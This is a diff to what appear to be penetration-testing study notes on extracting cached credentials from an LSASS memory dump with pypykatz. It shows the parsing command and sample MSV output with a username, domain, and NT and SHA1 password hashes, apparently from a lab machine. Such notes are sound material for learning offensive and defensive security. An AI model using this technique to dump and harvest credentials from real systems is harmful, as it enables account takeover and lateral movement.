@@ -34,3 +34,15 @@ Generating a memory dump of cached LSASS data
 pypykatz lsa minidump /path/to/dump
 ```
 important  info 
+- MSV
+ an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. Pypykatz extracted the `SID`, `Username`, `Domain`, and even the `NT` & `SHA1` password hashes associated with the bob user account's logon session stored in LSASS process memory
+ ```shellsession
+ sid S-1-5-21-4019466498-1700476312-3544718034-1001 luid 1354633 
+ == MSV== 
+ Username: bob Domain:
+ DESKTOP-33E7O54 
+ LM: NA NT: 64f12cddaa88057e06a81b54e73b949b 
+ SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8 
+ DPAPI: NA
+ ```
+ 
